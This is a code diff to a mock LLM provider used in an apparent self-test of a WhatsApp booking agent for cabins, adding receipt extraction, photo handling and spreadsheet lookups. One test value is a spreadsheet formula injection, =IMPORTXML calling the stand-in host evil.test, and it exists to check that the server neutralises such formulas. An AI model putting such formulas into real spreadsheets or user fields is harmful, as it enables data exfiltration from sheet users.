@@ -9,6 +9,7 @@ import { ATTACHMENT_MARKER } from "@/lib/inbound-media";
 import { TRAINER_IMAGE_READ_MARKER } from "@/lib/ai";
 import { TRAINER_IMAGE_MARKER } from "@/lib/trainer-image";
 import { DYNAMIC_TOOLS_HEADING } from "@/server/mcp/dynamic-tools";
+import { RECEIPT_EXTRACT_MARKER } from "@/lib/ai/receipt";
 
 /**
  * Proveedor LLM determinista para el self-test (contrato mocks.md).
@@ -70,8 +71,59 @@ function hasFile(c: InContent | undefined): boolean {
   return Array.isArray(c) && c.some((p) => p.type === "file");
 }
 
+/** 034: texto plano del archivo adjunto (el wa-mock deja marcas al final). */
+function attachmentText(c: InContent | undefined): string {
+  if (!Array.isArray(c)) return "";
+  const part = c.find((p) => p.type === "image_url" || p.type === "file");
+  const uri = part?.image_url?.url ?? part?.file?.file_data ?? "";
+  const b64 = uri.split(",")[1] ?? "";
+  const name = part?.file?.filename ?? "";
+  return `${Buffer.from(b64, "base64").toString("latin1")} ${name}`.toLowerCase();
+}
+
+/** 034: descripción de una foto que NO es un comprobante. */
+export const MOCK_PHOTO_SUMMARY = "una foto de la pileta de una cabaña";
+
+/**
+ * 034: lectura completa de un comprobante para la planilla. Marcas en el
+ * archivo: `notreceipt` → no es comprobante; `op123` → ese n° de operación
+ * (si no, uno fijo: dos envíos iguales = repetido); `inject` → un titular
+ * con fórmula (el servidor tiene que neutralizarla).
+ */
+function mockReceiptExtraction(system: string, file: string): string {
+  if (/notreceipt/.test(file)) return JSON.stringify({ is_receipt: false, values: {} });
+  const op = /op(\d+)/.exec(file)?.[1] ?? "000123456789";
+  const columns = (system.split("COLUMNAS:\n")[1] ?? "")
+    .split("\n\n")[0]!
+    .split("\n")
+    .map((l) => l.replace(/^- /, "").trim())
+    .filter(Boolean);
+  const known: Record<string, string> = {
+    fecha: "07/10/2026",
+    "fecha de la transferencia": "07/10/2026",
+    importe: "80000",
+    moneda: "ARS",
+    banco: "Banco Galicia",
+    "banco o billetera de origen": "Banco Galicia",
+    "titular de origen": /inject/.test(file) ? '=IMPORTXML("http://evil.test","//a")' : "Juan Pérez",
+    "cuit/cuil de origen": "20-12345678-9",
+    "cuenta de destino": "alias NEGOCIO.CABANAS",
+    "n° de operación": op,
+    operación: op,
+    concepto: /concepto: ([^\n]+)/i.exec(system)?.[1]?.trim() ?? "Seña",
+  };
+  const values: Record<string, string | null> = {};
+  for (const c of columns) values[c] = known[c.toLowerCase()] ?? null;
+  return JSON.stringify({ is_receipt: true, values, operation_id: op, amount: "80000" });
+}
+
 export function aiMockCompletion(messages: InMessage[]): string {
   const lastUserMsg = [...messages].reverse().find((m) => m.role === "user");
+  // 034: lectura completa del comprobante (antes que imagen/PDF: también trae archivo).
+  const sys0 = textOf(messages.find((m) => m.role === "system")?.content);
+  if (sys0.includes(RECEIPT_EXTRACT_MARKER)) {
+    return mockReceiptExtraction(sys0, attachmentText(lastUserMsg?.content));
+  }
   // 015: nota de voz → transcripción en texto plano (no JSON). Un `format`
   // flac dispara el sentinel de "sin contenido" para el camino infeliz.
   if (lastUserMsg && hasAudio(lastUserMsg.content)) {
@@ -89,6 +141,8 @@ export function aiMockCompletion(messages: InMessage[]): string {
     const parts = lastUserMsg.content as Exclude<InContent, string>;
     const file = parts.find((p) => p.type === "file")?.file;
     if (/ilegible/i.test(file?.filename ?? "")) return "[SIN_CONTENIDO]";
+    // 034: un PDF llamado «comprobante…» es un comprobante de transferencia.
+    if (/comprobante/i.test(file?.filename ?? "")) return "un comprobante de transferencia bancaria en PDF.";
     return MOCK_DOCUMENT_SUMMARY;
   }
 
@@ -102,6 +156,7 @@ export function aiMockCompletion(messages: InMessage[]): string {
     // incluidos); la del cliente (020) se describe en una línea.
     const sys = textOf(messages.find((m) => m.role === "system")?.content);
     if (sys.includes(TRAINER_IMAGE_READ_MARKER)) return MOCK_TRAINER_IMAGE_READING;
+    if (/photo/.test(attachmentText(lastUserMsg.content))) return MOCK_PHOTO_SUMMARY;
     return MOCK_IMAGE_SUMMARY;
   }
 
@@ -146,6 +201,12 @@ export function aiMockCompletion(messages: InMessage[]): string {
   // sección en el prompt y con disparadores concretos; si no, sigue de largo.
   const genericTurn = dispatchGenericTools(messages, system, lastUser);
   if (genericTurn) return genericTurn;
+
+  // 034: planillas de consulta. Responde con la fila que coincide con TODAS
+  // las palabras de la pregunta; si la planilla vino recortada y no está,
+  // pide `search_sheet`; con el resultado, contesta con la primera fila.
+  const sheetTurn = dispatchSheets(system, lastUser);
+  if (sheetTurn) return sheetTurn;
 
   // 020: adjunto del cliente. Va PRIMERO entre las ramas del agente: sin
   // esto el self-test no puede distinguir «el agente vio la foto» de «el
@@ -1174,5 +1235,40 @@ function dispatchGenericTools(
   if (/normas/.test(text) && has("list-house-rules")) {
     return JSON.stringify({ action: "use_tool", tool: "list-house-rules", args: {} });
   }
+  return null;
+}
+
+/* ---------------- 034: planillas de consulta ---------------- */
+
+const SHEET_STOPWORDS = new Set([
+  "cuanto", "cuánto", "sale", "salen", "precio", "precios", "la", "el", "en", "de", "del",
+  "por", "que", "qué", "hola", "noche", "temporada", "cabaña", "cabana", "y", "a", "me", "un", "una",
+]);
+
+function foldMock(s: string): string {
+  return s.normalize("NFD").replace(/\p{Diacritic}/gu, "").toLowerCase();
+}
+
+function dispatchSheets(system: string, lastUser: string): string | null {
+  if (!system.includes("PLANILLAS DEL NEGOCIO")) return null;
+  if (lastUser.startsWith("[PLANILLA]")) {
+    const row = lastUser.split("\n").find((l) => l.startsWith("- "));
+    return JSON.stringify({
+      action: "reply",
+      text: row ? `Según nuestra planilla: ${row.slice(2)}` : "No encontré ese dato en la planilla; lo consulto con el equipo.",
+    });
+  }
+  if (!/precio|cu[aá]nto|stock|cupo|sale/i.test(lastUser)) return null;
+  const terms = foldMock(lastUser)
+    .split(/[^a-z0-9]+/)
+    .filter((t) => t.length >= 3 && !SHEET_STOPWORDS.has(t));
+  if (terms.length === 0) return null;
+  const line = system
+    .split("\n")
+    .filter((l) => l.startsWith("- "))
+    .find((l) => terms.every((t) => foldMock(l).includes(t)));
+  if (line) return JSON.stringify({ action: "reply", text: `Según nuestra planilla: ${line.slice(2)}` });
+  const sheet = /"sheet":"([^"]+)"/.exec(system)?.[1];
+  if (sheet) return JSON.stringify({ action: "search_sheet", sheet, query: terms.join(" ") });
   return null;
 }
